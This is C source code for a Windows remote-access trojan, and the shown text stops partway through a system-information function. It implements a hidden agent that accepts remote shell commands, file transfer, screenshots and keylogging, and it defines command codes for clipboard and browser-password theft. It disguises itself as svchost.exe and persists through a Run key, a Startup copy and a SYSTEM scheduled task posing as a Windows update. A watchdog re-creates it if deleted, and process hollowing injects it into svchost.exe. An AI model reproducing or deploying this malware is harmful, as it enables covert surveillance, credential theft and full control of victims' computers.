

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <tlhelp32.h>
    #include <shlobj.h>
    #include <shlwapi.h>
    #include <winerror.h>
    
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "shell32.lib")
    #pragma comment(lib, "shlwapi.lib")
    #pragma comment(lib, "gdi32.lib")
    #pragma comment(lib, "user32.lib")
    #pragma comment(lib, "advapi32.lib")
    
    #ifndef S_OK
        #define S_OK 0x00000000L
    #endif
    
    #define SOCKET_CLOSE(s) closesocket(s)
    #define POPEN _popen
    #define PCLOSE _pclose
    #define sleep(seconds) Sleep((seconds) * 1000)
    
    #define SAFE_CLOSE(s) do { if (s != INVALID_SOCKET) { SOCKET_CLOSE(s); s = INVALID_SOCKET; } } while(0)
    
    #ifndef NTSTATUS
        typedef LONG NTSTATUS;
    #endif
    
    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
    
    #define WATCHDOG_INTERVAL 10
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <pthread.h>
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define SOCKET_CLOSE(s) close(s)
    #define SAFE_CLOSE(s) do { if (s != INVALID_SOCKET) { SOCKET_CLOSE(s); s = INVALID_SOCKET; } } while(0)
    #define POPEN popen
    #define PCLOSE pclose
#endif


#define DEFAULT_HOST "Your instance ip"
#define DEFAULT_PORT "your instace port"
#define MAX_PAYLOAD (10 * 1024 * 1024)
#define CHUNK_SIZE 1024
#define MAX_RETRIES 5
#define RETRY_DELAY 5
#define KEYLOG_SLEEP_MS 25
#define HEARTBEAT_INTERVAL 30


#define CMD_SHELL       0x01
#define CMD_UPLOAD      0x02
#define CMD_DOWNLOAD    0x03
#define CMD_SCREENSHOT  0x04
#define CMD_KEYSTROKE   0x05
#define CMD_PERSIST     0x06
#define CMD_UNINSTALL   0x07
#define CMD_SYSINFO     0x0A
#define CMD_CLIPBOARD   0x0C
#define CMD_BROWSER_PASS  0x0D
#define CMD_HOLLOW      0x0E
#define CMD_POPUP       0x0F
#define CMD_POPUP_REPLY 0x10

// XOR key
static const uint8_t xor_key[16] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
};

#ifdef _DEBUG
    #define DEBUG_PRINT(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
    #define DEBUG_PRINT(fmt, ...) ((void)0)
#endif

// Global saved connection info
static char g_saved_host[256] = {0};
static int g_saved_port = 0;

// ========== STEALTH FUNCTIONS ==========
#ifdef _WIN32
static void hide_from_taskbar(void) {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
        SetWindowLongA(hWnd, GWL_EXSTYLE, 
            GetWindowLongA(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
    }
}

static void cloak_process_name(void) {
    SetConsoleTitleA("svchost.exe");
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        SetWindowTextA(hWnd, "svchost.exe");
    }
}

static void init_stealth(void) {
    FreeConsole();
    hide_from_taskbar();
    cloak_process_name();
}
#endif

// ========== SAVE/LOAD CONNECTION INFO ==========
static void save_connection_info(const char* host, int port) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        char host_info[256];
        snprintf(host_info, sizeof(host_info), "%s", host);
        RegSetValueExA(hKey, "LastHost", 0, REG_SZ, (BYTE*)host_info, (DWORD)strlen(host_info));
        
        char port_info[32];
        snprintf(port_info, sizeof(port_info), "%d", port);
        RegSetValueExA(hKey, "LastPort", 0, REG_SZ, (BYTE*)port_info, (DWORD)strlen(port_info));
        
        RegCloseKey(hKey);
        DEBUG_PRINT("[CONFIG] Saved connection info to registry: %s:%d\n", host, port);
    }
    
    // Also save to file
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    strcat(temp_path, "svchost.cfg");
    
    FILE* cfg = fopen(temp_path, "w");
    if (cfg) {
        fprintf(cfg, "%s\n%d", host, port);
        fclose(cfg);
        DEBUG_PRINT("[CONFIG] Saved connection info to %s\n", temp_path);
    }
}

static void load_connection_info(void) {
    // Try registry first
    HKEY hKey;
    char saved_data[256] = {0};
    DWORD size = sizeof(saved_data);
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        if (RegQueryValueExA(hKey, "LastHost", NULL, NULL, (BYTE*)saved_data, &size) == ERROR_SUCCESS) {
            strncpy(g_saved_host, saved_data, sizeof(g_saved_host) - 1);
            DEBUG_PRINT("[CONFIG] Loaded host from registry: %s\n", g_saved_host);
        }
        
        size = sizeof(saved_data);
        if (RegQueryValueExA(hKey, "LastPort", NULL, NULL, (BYTE*)saved_data, &size) == ERROR_SUCCESS) {
            g_saved_port = atoi(saved_data);
            DEBUG_PRINT("[CONFIG] Loaded port from registry: %d\n", g_saved_port);
        }
        
        RegCloseKey(hKey);
    }
    
    // Try config file if registry failed
    if (g_saved_host[0] == 0) {
        char temp_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        strcat(temp_path, "svchost.cfg");
        
        FILE* cfg = fopen(temp_path, "r");
        if (cfg) {
            fscanf(cfg, "%s", g_saved_host);
            fscanf(cfg, "%d", &g_saved_port);
            fclose(cfg);
            DEBUG_PRINT("[CONFIG] Loaded connection info from file: %s:%d\n", g_saved_host, g_saved_port);
        }
    }
}

// ========== ANTI-DELETION WATCHDOG ==========
static DWORD WINAPI watchdog_thread(LPVOID param) {
    char exe_path[MAX_PATH];
    char backup_path[MAX_PATH];
    char startup_path[MAX_PATH];
    
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    GetTempPathA(MAX_PATH, backup_path);
    strcat(backup_path, "svchost.exe.bak");
    
    CopyFileA(exe_path, backup_path, FALSE);
    
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path);
    char startup_exe[MAX_PATH];
    snprintf(startup_exe, sizeof(startup_exe), "%s\\svchost.exe", startup_path);
    CopyFileA(exe_path, startup_exe, FALSE);
    
    while (1) {
        sleep(WATCHDOG_INTERVAL);
        
        if (GetFileAttributesA(exe_path) == INVALID_FILE_ATTRIBUTES) {
            CopyFileA(backup_path, exe_path, FALSE);
            DEBUG_PRINT("[WATCHDOG] Restored deleted agent\n");
        }
        
        if (GetFileAttributesA(startup_exe) == INVALID_FILE_ATTRIBUTES) {
            CopyFileA(exe_path, startup_exe, FALSE);
        }
        
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char value[512] = {0};
            DWORD size = sizeof(value);
            if (RegQueryValueExA(hKey, "ehSched", NULL, NULL, (BYTE*)value, &size) != ERROR_SUCCESS) {
                RegCloseKey(hKey);
                RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, KEY_SET_VALUE, &hKey);
                RegSetValueExA(hKey, "ehSched", 0, REG_SZ,
                             (BYTE*)exe_path, (DWORD)strlen(exe_path));
            }
            RegCloseKey(hKey);
        }
    }
    return 0;
}

// ========== TWO-WAY POPUP WITH REPLY ==========
static void cmd_popup(SOCKET client, const uint8_t* data, size_t data_len) {
    DEBUG_PRINT("[POPUP] Displaying message with reply option\n");
    
    char* full = (char*)malloc(data_len + 1);
    if (!full) {
        send_frame(client, CMD_POPUP, (uint8_t*)"ERROR", 5);
        return;
    }
    
    memcpy(full, data, data_len);
    full[data_len] = '\0';
    
    char* title = full;
    char* msg = strchr(full, '|');
    
    if (msg) {
        *msg = '\0';
        msg++;
    } else {
        title = "Message from Admin";
        msg = full;
    }
    
    #ifdef _WIN32
        int reply = MessageBoxA(NULL, msg, title, MB_YESNOCANCEL | MB_ICONQUESTION | MB_SETFOREGROUND);
        
        char response[256];
        if (reply == IDYES) {
            snprintf(response, sizeof(response), "REPLY: YES - %s", msg);
            send_frame(client, CMD_POPUP_REPLY, (uint8_t*)response, (uint32_t)strlen(response));
            DEBUG_PRINT("[POPUP] Host replied: YES\n");
        } else if (reply == IDNO) {
            snprintf(response, sizeof(response), "REPLY: NO - %s", msg);
            send_frame(client, CMD_POPUP_REPLY, (uint8_t*)response, (uint32_t)strlen(response));
            DEBUG_PRINT("[POPUP] Host replied: NO\n");
        } else if (reply == IDCANCEL) {
            send_frame(client, CMD_POPUP_REPLY, (uint8_t*)"REPLY: CANCELLED", 16);
            DEBUG_PRINT("[POPUP] Host cancelled\n");
        } else {
            send_frame(client, CMD_POPUP_REPLY, (uint8_t*)"REPLY: CLOSED", 13);
        }
    #endif
    
    free(full);
}

// ========== Keylogger Structures ==========
typedef struct {
    char buffer[65536];
    int pos;
    CRITICAL_SECTION lock;
    FILE* log_file;
    time_t last_send;
    int active;
    HANDLE thread;
} KeyloggerState;

static KeyloggerState g_keylogger = {0};

// ========== Encryption Functions ==========
static void xor_buffer(uint8_t* data, size_t len, size_t offset) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xor_key[(offset + i) % 16];
    }
}

static int send_all(SOCKET sock, const uint8_t* buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        int sent = send(sock, (const char*)buf + total, (int)(len - total), 0);
        if (sent <= 0) return -1;
        total += sent;
    }
    return 0;
}

static int recv_all(SOCKET sock, uint8_t* buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        int received = recv(sock, (char*)buf + total, (int)(len - total), 0);
        if (received <= 0) return -1;
        total += received;
    }
    return 0;
}

static int send_frame(SOCKET sock, uint8_t cmd, const uint8_t* payload, uint32_t payload_len) {
    uint8_t* frame;
    size_t frame_len = 5 + payload_len;
    
    if (payload_len > MAX_PAYLOAD) return -1;
    
    frame = (uint8_t*)malloc(frame_len);
    if (!frame) return -1;
    
    frame[0] = cmd;
    frame[1] = (payload_len >> 24) & 0xFF;
    frame[2] = (payload_len >> 16) & 0xFF;
    frame[3] = (payload_len >> 8) & 0xFF;
    frame[4] = payload_len & 0xFF;
    
    if (payload_len > 0 && payload) {
        memcpy(frame + 5, payload, payload_len);
    }
    
    xor_buffer(frame, frame_len, 0);
    int result = send_all(sock, frame, frame_len);
    free(frame);
    return result;
}

static int recv_frame(SOCKET sock, uint8_t* cmd, uint8_t** payload, uint32_t* payload_len) {
    uint8_t header[5];
    
    if (recv_all(sock, header, 5) != 0) return -1;
    xor_buffer(header, 5, 0);
    
    *cmd = header[0];
    *payload_len = (header[1] << 24) | (header[2] << 16) | (header[3] << 8) | header[4];
    
    if (*payload_len > MAX_PAYLOAD) return -1;
    
    if (*payload_len > 0) {
        *payload = (uint8_t*)malloc(*payload_len);
        if (!*payload) return -1;
        
        if (recv_all(sock, *payload, *payload_len) != 0) {
            free(*payload);
            return -1;
        }
        xor_buffer(*payload, *payload_len, 5);
    } else {
        *payload = NULL;
    }
    
    return 0;
}

// ========== HEARTBEAT THREAD ==========
static DWORD WINAPI heartbeat_thread(LPVOID param) {
    SOCKET sock = (SOCKET)(intptr_t)param;
    while (1) {
        sleep(HEARTBEAT_INTERVAL);
        send_frame(sock, 0xFF, (uint8_t*)"ping", 4);
    }
    return 0;
}

// ========== KEYLOGGER ==========
static DWORD WINAPI keylogger_thread(LPVOID param) {
    while (g_keylogger.active) {
        for (int key = 32; key < 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                WORD wchar[2];
                UINT scan = MapVirtualKey(key, MAPVK_VK_TO_VSC);
                char key_str[32] = {0};
                
                int result = ToUnicode(key, scan, keyboard_state, wchar, 2, 0);
                
                if (result > 0) {
                    WideCharToMultiByte(CP_UTF8, 0, wchar, 1, key_str, sizeof(key_str), NULL, NULL);
                } else {
                    switch (key) {
                        case VK_RETURN:  strcpy(key_str, "[ENTER]\n"); break;
                        case VK_BACK:    strcpy(key_str, "[BACKSPACE]"); break;
                        case VK_TAB:     strcpy(key_str, "[TAB]"); break;
                        case VK_SPACE:   strcpy(key_str, " "); break;
                        default: continue;
                    }
                }
                
                if (key_str[0]) {
                    EnterCriticalSection(&g_keylogger.lock);
                    
                    time_t now = time(NULL);
                    struct tm* tm_info = localtime(&now);
                    char time_str[20];
                    strftime(time_str, sizeof(time_str), "%H:%M:%S", tm_info);
                    
                    int written = snprintf(g_keylogger.buffer + g_keylogger.pos,
                                          sizeof(g_keylogger.buffer) - g_keylogger.pos,
                                          "[%s] %s", time_str, key_str);
                    
                    if (written > 0) {
                        g_keylogger.pos += written;
                        if (g_keylogger.pos > (sizeof(g_keylogger.buffer) * 0.8)) {
                            g_keylogger.pos = 0;
                        }
                    }
                    
                    LeaveCriticalSection(&g_keylogger.lock);
                }
            }
        }
        Sleep(KEYLOG_SLEEP_MS);
    }
    return 0;
}

static void start_keylogger(void) {
    if (g_keylogger.active) return;
    
    InitializeCriticalSection(&g_keylogger.lock);
    g_keylogger.pos = 0;
    memset(g_keylogger.buffer, 0, sizeof(g_keylogger.buffer));
    g_keylogger.active = 1;
    
    char log_path[MAX_PATH];
    GetTempPathA(MAX_PATH, log_path);
    strcat(log_path, "svchost.dat");
    g_keylogger.log_file = fopen(log_path, "a");
    
    g_keylogger.thread = CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL);
}

static void stop_keylogger(void) {
    if (!g_keylogger.active) return;
    
    g_keylogger.active = 0;
    WaitForSingleObject(g_keylogger.thread, 3000);
    CloseHandle(g_keylogger.thread);
    
    if (g_keylogger.log_file) {
        fclose(g_keylogger.log_file);
    }
    
    DeleteCriticalSection(&g_keylogger.lock);
}

static void cmd_keystroke(SOCKET client) {
    EnterCriticalSection(&g_keylogger.lock);
    
    if (g_keylogger.pos > 0) {
        send_frame(client, CMD_KEYSTROKE, (uint8_t*)g_keylogger.buffer, g_keylogger.pos);
        memset(g_keylogger.buffer, 0, sizeof(g_keylogger.buffer));
        g_keylogger.pos = 0;
    } else {
        send_frame(client, CMD_KEYSTROKE, (uint8_t*)"No keys captured", 16);
    }
    
    LeaveCriticalSection(&g_keylogger.lock);
}

// ========== PROCESS HOLLOWING ==========
static const char* hollow_targets[] = {
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\RuntimeBroker.exe",
    "C:\\Windows\\System32\\SearchIndexer.exe",
    "C:\\Windows\\explorer.exe",
    NULL
};

static BOOL IsProcessRunning(const char* process_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, process_name) == 0) {
                CloseHandle(snap);
                return TRUE;
            }
        } while (Process32Next(snap, &pe));
    }
    
    CloseHandle(snap);
    return FALSE;
}

static const char* GetBestTarget(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(snap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "svchost.exe") == 0) {
                    CloseHandle(snap);
                    return hollow_targets[0];
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    
    return hollow_targets[0];
}

static PVOID GetProcessEntryPoint(HANDLE hProcess, HANDLE hThread) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        return NULL;
    }
    
    #ifdef _WIN64
        return (PVOID)ctx.Rcx;
    #else
        return (PVOID)ctx.Eax;
    #endif
}

static BOOL UnmapExecutable(HANDLE hProcess, PVOID entryPoint) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (!NtUnmapViewOfSection) return FALSE;
    
    NTSTATUS status = NtUnmapViewOfSection(hProcess, entryPoint);
    return (status == 0);
}

static BOOL PerformProcessHollowing(const char* target_path, 
                                     const uint8_t* payload, 
                                     SIZE_T payload_size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    char cmd_line[MAX_PATH];
    
    si.cb = sizeof(si);
    snprintf(cmd_line, sizeof(cmd_line), "\"%s\"", target_path);
    
    DEBUG_PRINT("[HOLLOW] Targeting: %s\n", target_path);
    DEBUG_PRINT("[HOLLOW] Payload size: %zu bytes\n", payload_size);
    
    if (!CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DEBUG_PRINT("[HOLLOW] CreateProcess failed: %d\n", GetLastError());
        return FALSE;
    }
    
    DEBUG_PRINT("[HOLLOW] Created suspended process PID: %d\n", pi.dwProcessId);
    
    PVOID entryPoint = GetProcessEntryPoint(pi.hProcess, pi.hThread);
    if (!entryPoint) {
        DEBUG_PRINT("[HOLLOW] Failed to get entry point\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    DEBUG_PRINT("[HOLLOW] Original entry point: 0x%p\n", entryPoint);
    
    UnmapExecutable(pi.hProcess, entryPoint);
    
    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_size,
                                        MEM_COMMIT | MEM_RESERVE, 
                                        PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteCode) {
        DEBUG_PRINT("[HOLLOW] VirtualAllocEx failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    DEBUG_PRINT("[HOLLOW] Allocated memory at: 0x%p\n", pRemoteCode);
    
    if (!WriteProcessMemory(pi.hProcess, pRemoteCode, payload, payload_size, NULL)) {
        DEBUG_PRINT("[HOLLOW] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    DEBUG_PRINT("[HOLLOW] Wrote %zu bytes to remote process\n", payload_size);
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        DEBUG_PRINT("[HOLLOW] GetThreadContext failed\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    #ifdef _WIN64
        ctx.Rcx = (DWORD64)pRemoteCode;
    #else
        ctx.Eax = (DWORD)pRemoteCode;
    #endif
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        DEBUG_PRINT("[HOLLOW] SetThreadContext failed\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    ResumeThread(pi.hThread);
    DEBUG_PRINT("[HOLLOW] Process hollowing successful!\n");
    DEBUG_PRINT("[HOLLOW] Payload running as: %s\n", target_path);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

static void cmd_hollow(SOCKET client, const uint8_t* data, size_t data_len) {
    DEBUG_PRINT("[HOLLOW] Process hollowing command received\n");
    
    char agent_path[MAX_PATH];
    GetModuleFileNameA(NULL, agent_path, MAX_PATH);
    
    // Save connection info before hollowing
    save_connection_info(DEFAULT_HOST, DEFAULT_PORT);
    
    FILE* fp = fopen(agent_path, "rb");
    if (!fp) {
        send_frame(client, CMD_HOLLOW, (uint8_t*)"ERROR: Cannot read agent", 24);
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    if (file_size <= 0 || file_size > MAX_PAYLOAD) {
        fclose(fp);
        send_frame(client, CMD_HOLLOW, (uint8_t*)"ERROR: Invalid file size", 24);
        return;
    }
    
    uint8_t* agent_data = (uint8_t*)malloc(file_size);
    if (!agent_data) {
        fclose(fp);
        send_frame(client, CMD_HOLLOW, (uint8_t*)"ERROR: Memory allocation failed", 31);
        return;
    }
    
    size_t bytes_read = fread(agent_data, 1, file_size, fp);
    fclose(fp);
    
    if (bytes_read != (size_t)file_size) {
        free(agent_data);
        send_frame(client, CMD_HOLLOW, (uint8_t*)"ERROR: Failed to read agent", 27);
        return;
    }
    
    const char* target = GetBestTarget();
    
    if (PerformProcessHollowing(target, agent_data, file_size)) {
        char success_msg[256];
        snprintf(success_msg, sizeof(success_msg), 
                 "SUCCESS: Agent hollowed into %s", target);
        send_frame(client, CMD_HOLLOW, (uint8_t*)success_msg, (uint32_t)strlen(success_msg));
        
        free(agent_data);
        Sleep(2000);
        exit(0);
    } else {
        send_frame(client, CMD_HOLLOW, (uint8_t*)"ERROR: Process hollowing failed", 31);
        free(agent_data);
    }
}

// ========== AUTO-START (PERSISTENCE) ==========
static void cmd_persist(SOCKET client) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    int success = 0;
    char msg[256];
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, "ehSched", 0, REG_SZ,
                         (BYTE*)exe_path, (DWORD)strlen(exe_path)) == ERROR_SUCCESS) {
            success = 1;
            snprintf(msg, sizeof(msg), "SUCCESS: Registry persistence added");
        }
        RegCloseKey(hKey);
    }
    
    if (!success) {
        char startup_path[MAX_PATH];
        char dest_path[MAX_PATH];
        
        HRESULT hr = SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path);
        if (hr == S_OK) {
            snprintf(dest_path, sizeof(dest_path), "%s\\svchost.exe", startup_path);
            if (CopyFileA(exe_path, dest_path, FALSE)) {
                success = 1;
                snprintf(msg, sizeof(msg), "SUCCESS: Startup folder persistence added");
            }
        }
    }
    
    if (!success) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
            "schtasks /create /tn \"Microsoft\\Windows\\Update\\UpdateTask\" "
            "/tr \"%s\" /sc onlogon /f /ru SYSTEM", exe_path);
        
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            success = 1;
            snprintf(msg, sizeof(msg), "SUCCESS: Scheduled task persistence added");
        }
    }
    
    if (success) {
        send_frame(client, CMD_PERSIST, (uint8_t*)msg, (uint32_t)strlen(msg));
        DEBUG_PRINT("[PERSIST] %s\n", msg);
    } else {
        const char* error = "ERROR: All persistence methods failed";
        send_frame(client, CMD_PERSIST, (uint8_t*)error, (uint32_t)strlen(error));
        DEBUG_PRINT("[PERSIST] All methods failed\n");
    }
}

// ========== OTHER COMMANDS ==========
static void cmd_shell(SOCKET client, const uint8_t* data, size_t data_len) {
    char* cmd = (char*)malloc(data_len + 1);
    if (!cmd) return;
    
    memcpy(cmd, data, data_len);
    cmd[data_len] = '\0';
    
    FILE* pipe = POPEN(cmd, "r");
    free(cmd);
    
    if (!pipe) {
        send_frame(client, CMD_SHELL, (uint8_t*)"Failed to execute", 17);
        return;
    }
    
    char buffer[CHUNK_SIZE];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), pipe)) > 0) {
        send_frame(client, CMD_SHELL, (uint8_t*)buffer, (uint32_t)bytes);
    }
    
    PCLOSE(pipe);
    send_frame(client, CMD_SHELL, NULL, 0);
}

static void cmd_upload(SOCKET client, const uint8_t* data, size_t data_len) {
    if (data_len < 2) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Invalid upload data", 26);
        return;
    }
    
    uint16_t path_len = (data[0] << 8) | data[1];
    
    if (path_len == 0 || path_len > 256) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Invalid filename length", 30);
        return;
    }
    
    if (data_len < 2 + path_len) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Incomplete upload data", 28);
        return;
    }
    
    char* path = (char*)malloc(path_len + 1);
    if (!path) return;
    
    memcpy(path, data + 2, path_len);
    path[path_len] = '\0';
    
    size_t file_len = data_len - 2 - path_len;
    const uint8_t* file_data = data + 2 + path_len;
    
    FILE* fp = fopen(path, "wb");
    free(path);
    
    if (!fp) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Cannot open file", 24);
        return;
    }
    
    size_t written = fwrite(file_data, 1, file_len, fp);
    fclose(fp);
    
    if (written == file_len) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"SUCCESS: Upload complete", 24);
    } else {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Write failed", 19);
    }
}

static void cmd_download(SOCKET client, const uint8_t* data, size_t data_len) {
    if (data_len == 0) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: No filename", 18);
        return;
    }
    
    char* filename = (char*)malloc(data_len + 1);
    if (!filename) return;
    
    memcpy(filename, data, data_len);
    filename[data_len] = '\0';
    
    FILE* fp = fopen(filename, "rb");
    free(filename);
    
    if (!fp) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: File not found", 21);
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    if (file_size <= 0 || file_size > MAX_PAYLOAD) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: Invalid file", 18);
        fclose(fp);
        return;
    }
    
    uint8_t* file_data = (uint8_t*)malloc(file_size);
    if (file_data) {
        fread(file_data, 1, file_size, fp);
        send_frame(client, CMD_DOWNLOAD, file_data, (uint32_t)file_size);
        free(file_data);
    }
    
    fclose(fp);
}

static void cmd_screenshot(SOCKET client) {
    #ifdef _WIN32
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HDC hdcScreen = GetDC(NULL);
        if (!hdcScreen) return;
        
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
        
        BITMAPINFOHEADER bi = {0};
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = -height;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        
        DWORD row_size = ((width * 24 + 31) / 32) * 4;
        DWORD image_size = row_size * height;
        
        uint8_t* pixels = (uint8_t*)malloc(image_size);
        if (pixels) {
            GetDIBits(hdcMem, hBitmap, 0, height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
            
            BITMAPFILEHEADER bf = {0};
            bf.bfType = 0x4D42;
            bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + image_size;
            bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
            
            uint32_t total_size = bf.bfSize;
            uint8_t* bmp = (uint8_t*)malloc(total_size);
            
            if (bmp) {
                memcpy(bmp, &bf, sizeof(BITMAPFILEHEADER));
                memcpy(bmp + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
                memcpy(bmp + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels, image_size);
                send_frame(client, CMD_SCREENSHOT, bmp, total_size);
                free(bmp);
            }
            free(pixels);
        }
        
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
    #endif
}

static void cmd_sysinfo(SOCKET client) {
    char info[4096] = {0};
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD comp_size = sizeof(computer_name);
    char user_name[256];
    DWORD user_size = sizeof(user_name);
    
    GetComputerNameA(computer_name, &comp_size);
    GetUserNameA(user_name, &user_size);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    
    snprintf(info, sizeof(info),
        "Time: %02d/%02d/%04d %02d:%02d:%02d\n"
        "Computer: %s\nUser: %s\nCPU Cores: %d\n"
        "RAM: %.2f GB / %.2f GB free\n",
        st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond,
        computer_name, user_name,
        sys_info.dwNumberOfProcessors,
        mem_status.ullTotalPhys / (1024.0 * 1024.0 * 1024.0),
        mem_status.ullAvailPhys / (1024.0 * 1024.0 * 1024.0));
    
